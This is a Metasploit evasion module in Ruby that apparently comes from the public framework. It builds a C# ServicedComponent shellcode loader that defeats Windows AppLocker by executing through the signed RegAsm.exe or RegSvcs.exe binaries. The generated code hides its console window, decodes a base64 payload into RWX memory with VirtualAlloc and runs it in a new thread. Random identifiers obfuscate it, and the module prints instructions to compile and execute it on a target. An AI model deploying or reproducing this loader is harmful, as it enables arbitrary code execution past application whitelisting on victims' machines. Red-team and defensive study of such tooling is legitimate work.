##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Applocker Evasion - Microsoft .NET Assembly Registration Utility',
      'Description' => %(
         This module will assist you in evading Microsoft
         Windows Applocker and Software Restriction Policies.
         This technique utilises the Microsoft signed binaries
         RegAsm.exe or RegSvcs.exe to execute user supplied code.
                        ),
      'Author'      =>
      [
        'Nick Tyrer <@NickTyrer>', # module development
        'Casey Smith' # regasm_regsvcs bypass research
      ],
      'License'     => 'MSF_LICENSE',
      'Platform'    => 'win',
      'Arch'        => [ARCH_X86, ARCH_X64],
      'Targets'     => [['Microsoft Windows', {}]],
      'References'  => [['URL', 'https://attack.mitre.org/techniques/T1121/']])
    )

    register_options(
      [
        OptString.new('TXT_FILE', [true, 'Filename for the evasive file (default: regasm_regsvcs.txt)', 'regasm_regsvcs.txt']),
        OptString.new('SNK_FILE', [true, 'Filename for the .snk file (default: key.snk)', 'key.snk'])
      ]
    )

    deregister_options('FILENAME')
  end

  def build_payload
    Rex::Text.encode_base64(payload.encoded)
  end

  def obfu
    Rex::Text.rand_text_alpha 8
  end

  def regasm_regsvcs
    esc = build_payload
    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]
    <<~HEREDOC
      using System;
      using System.EnterpriseServices;
      using System.Runtime.InteropServices;
      namespace #{mod[0]}
      {
      public class #{mod[1]} : ServicedComponent
      {
      [ComRegisterFunction]
      public static void RegisterClass(string #{mod[2]})
      {
      #{mod[3]}.#{mod[14]}();
      }
      [ComUnregisterFunction]
      public static void UnRegisterClass(string #{mod[2]})
      {
      #{mod[3]}.#{mod[14]}();
      }
      }
      public class #{mod[3]}
      {
      private static Int32 #{mod[4]}=0x1000;
      private static IntPtr #{mod[5]}=(IntPtr)0x40;
      private static UInt32 #{mod[6]} = 0xFFFFFFFF;
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
      [System.Runtime.InteropServices.DllImport("user32.dll")]
      static extern bool ShowWindow(IntPtr #{mod[7]}, int nCmdShow);
      [System.Runtime.InteropServices.DllImport("Kernel32")]
      private static extern IntPtr GetConsoleWindow();
      const int #{mod[8]} = 0;
      public static void #{mod[14]}()
      {
      IntPtr #{mod[7]};
      #{mod[7]} = GetConsoleWindow();
      ShowWindow(#{mod[7]}, #{mod[8]});
      string #{mod[9]} = "#{esc}";
      byte[] #{mod[10]} = Convert.FromBase64String(#{mod[9]});
      byte[] #{mod[11]} = #{mod[10]};
      IntPtr #{mod[12]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[11]}.Length, #{mod[4]}, #{mod[5]});
      System.Runtime.InteropServices.Marshal.Copy(#{mod[11]}, 0, #{mod[12]}, #{mod[11]}.Length);
      IntPtr #{mod[13]} = IntPtr.Zero;
      WaitForSingleObject(CreateThread(#{mod[13]}, UIntPtr.Zero, #{mod[12]}, #{mod[13]}, 0, ref #{mod[13]}), #{mod[6]});
      }
      }
      }
    HEREDOC
  end

  def snk
    debaser = 'BwIAAAAkAABSU0EyAAQAAAEAAQD9yIxqf9oJgwLw6nUHqVNq4LaP+/eaL4qTT9K9aV/z7ddCP8+Uf2/47KnHklpaw+eH03ZaA2yKYBA9s+Al0VoyajA76HQp
    HDaCgiURBIT2GBLUGwdhoEMWX5J8eoCzkucJEjSsavQh+r9JeB6zcQvoZIx0PrpELgQc8is8j2jvsFuc5LQ8ZFoPk1273TTxKibw84HFESjxJrRtkSjwoEo4OUuZtL3C7fD
    gnaSoeLnMwohmyTTjt15zgBZv7xD5u/CHD4/+tySJufY5j0FkBxhyqt2DWHcmH4MQCC6PgYfIuTXEAD35o0cg+6s6pJYKB+DUCrU5vSime3jyWno9vCe87UT+fQcDrKntHB
    mjnj9WliAMZlU1IuCWieT7fzGZqqIsd4rrcgxetnWzaWRAkgHcTVkmVPIt0z9zHU71s7CER2viklJkiaZjRQan5ZA7bTqqsuG1xoIyXTWbKsaAMCKf5a4IJS2ImpqaYA9HR
    BrIV7be2o0QJxSm1LPqBXJqkAhnCpcYyfve2dql7fF+fAIDGe3ZgCEbJsfYuAaAY0snGJQhUgLmwO8GDbsbMUTuBQspDv8QXsF53UNH5v5dnOKaTfo71LrI+I5zBUqEYP3B
    DtK0qryu/J1eq80nPAmpNqRbFnYm1OdGKpgzHS+Ws7obPSt1HG3//BxC3a5znX0evfCfSaaWRswhjvblnh1070b3jkT6nJeksKuuVEHvudAQAtGn2vxNDs4CqrJODi5Z/BA
    KgpIZqQeZmh3r4Zb5OI0='
    Rex::Text.decode_base64(debaser)
  end

  def file_format_filename(name = '')
    name.empty? ? @fname : @fname = name
  end

  def create_files
    f1 = datastore['TXT_FILE'].empty? ? 'regasm_regsvcs.txt' : datastore['TXT_FILE']
    f1 << '.txt' unless f1.downcase.end_with?('.txt')
    f2 = datastore['SNK_FILE'].empty? ? 'key.snk' : datastore['SNK_FILE']
    f2 << '.snk' unless f2.downcase.end_with?('.snk')
    txt_file = regasm_regsvcs
    snk_file = snk
    file_format_filename(f1)
    file_create(txt_file)
    file_format_filename(f2)
    file_create(snk_file)
  end

  def instructions
    print_status "Copy #{datastore['TXT_FILE']} and #{datastore['SNK_FILE']} to the target"
    if payload.arch.first == ARCH_X86
      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:#{datastore['TXT_FILE'].gsub('.txt', '.dll')} /keyfile:#{datastore['SNK_FILE']} #{datastore['TXT_FILE']}"
      print_status "Execute using: C:\\Windows\\Microsoft.NET\\Framework\\[.NET Version]\\regsvcs.exe #{datastore['TXT_FILE'].gsub('.txt', '.dll')}"
      print_status 'or'
      print_status "Execute using: C:\\Windows\\Microsoft.NET\\Framework\\[.NET Version]\\regasm.exe /U #{datastore['TXT_FILE'].gsub('.txt', '.dll')}"
    else
      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:#{datastore['TXT_FILE'].gsub('.txt', '.dll')} /keyfile:#{datastore['SNK_FILE']} #{datastore['TXT_FILE']}"
      print_status "Execute using: C:\\Windows\\Microsoft.NET\\Framework64\\[.NET Version]\\regsvcs.exe #{datastore['TXT_FILE'].gsub('.txt', '.dll')}"
      print_status 'or'
      print_status "Execute using: C:\\Windows\\Microsoft.NET\\Framework64\\[.NET Version]\\regasm.exe /U #{datastore['TXT_FILE'].gsub('.txt', '.dll')}"
    end
  end

  def run
    create_files
    instructions
  end
end
